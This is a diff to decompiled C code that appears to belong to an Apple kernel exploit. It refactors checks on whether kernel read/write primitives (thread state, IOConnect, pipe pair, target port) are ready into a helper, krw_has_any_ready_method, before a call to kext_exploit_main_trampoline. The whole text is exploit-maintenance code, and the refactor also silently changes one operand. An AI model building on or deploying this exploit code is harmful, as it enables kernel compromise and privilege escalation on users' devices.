@@ -790,6 +790,21 @@ static krw_setup_path_t krw_select_setup_path(struct_krwCtx *krwCtx)
   return KRW_SETUP_PATH_VOUCHER;
 }
 
+static bool krw_has_any_ready_method(struct_krwCtx *krwCtx)
+{
+  bool hasThreadStateKrw = krwCtx->threadForKernelRead + 1 >= 2 && *(uint64_t *)&krwCtx->gap42[40];
+  bool hasIOConnectKrw = (unsigned int)(*(uint32_t *)&krwCtx->gap42[56] + 1) >= 2
+                      && *(uint64_t *)&krwCtx->gap42[72]
+                      && *(uint64_t *)&krwCtx->gap42[80];
+  bool hasPipePairKrw = krwCtx->gap1911[0] != -1
+                     && krwCtx->gap1911[1] != -1
+                     && ((krwCtx->gap1915 != -1 && krwCtx->gap190u)
+                      || (krwCtx->gap1913 != -1 && krwCtx->gap1914 != -1));
+  bool hasTargetPortKrw = (unsigned int)(LODWORD(krwCtx->gap191[693]) + 1) >= 2;
+
+  return hasThreadStateKrw || hasIOConnectKrw || hasPipePairKrw || hasTargetPortKrw;
+}
+
 __int64 __fastcall j__fileport_makeport(int a1, mach_port_t *a2);
 int __fastcall j__fileport_makefd(mach_port_t);
 __int64 __fastcall __mac_syscall(__int64 a1, __int64 a2, __int64 a3);
@@ -45192,16 +45207,7 @@ LABEL_96:
     }
     if ( !v39 )
       return 163869;
-    bool hasThreadStateKrw = krwCtx->threadForKernelRead + 1 >= 2 && *(uint64_t *)&krwCtx->gap42[40];
-    bool hasIOConnectKrw = (unsigned int)(*(uint32_t *)&krwCtx->gap42[56] + 1) >= 2
-                        && *(uint64_t *)&krwCtx->gap42[72]
-                        && *(uint64_t *)&krwCtx->gap42[80];
-    bool hasPipePairKrw = *(uint32_t *)gap192 != -1
-                       && krwCtx->gap1911[1] != -1
-                       && ((krwCtx->gap1915 != -1 && krwCtx->gap190u)
-                        || (krwCtx->gap1913 != -1 && krwCtx->gap1914 != -1));
-    bool hasTargetPortKrw = (unsigned int)(LODWORD(krwCtx->gap191[693]) + 1) >= 2;
-    if ( v96 && (hasThreadStateKrw || hasIOConnectKrw || hasPipePairKrw || hasTargetPortKrw) )
+    if ( v96 && krw_has_any_ready_method(krwCtx) )
     {
       krw_ctx_set_flag(krwCtx, KRW_CTX_FLAG_KRW_METHODS_READY);
     }
@@ -45211,14 +45217,7 @@ LABEL_96:
     v42 = 128;
   else
     v42 = 1152;
-  if ( (krwCtx->threadForKernelRead + 1 < 2 || !*(uint64_t *)&krwCtx->gap42[40])
-    && ((unsigned int)(*(uint32_t *)&krwCtx->gap42[56] + 1) < 2
-     || !*(uint64_t *)&krwCtx->gap42[72]
-     || !*(uint64_t *)&krwCtx->gap42[80])
-    && (*(uint32_t *)gap192 == -1
-     || krwCtx->gap1911[1] == -1
-     || (krwCtx->gap1913 == -1 || krwCtx->gap1914 == -1) && (krwCtx->gap1915 == -1 || !krwCtx->gap190u))
-    && (unsigned int)(LODWORD(krwCtx->gap191[693]) + 1) <= 1 )
+  if ( !krw_has_any_ready_method(krwCtx) )
   {
     mach_port_with_a2 = kext_exploit_main_trampoline((uint64_t)krwCtx, krwCtx->gap19210, 0, (uint64_t)&krwCtx->gap191[693]);
     if ( (uint32_t)mach_port_with_a2 )
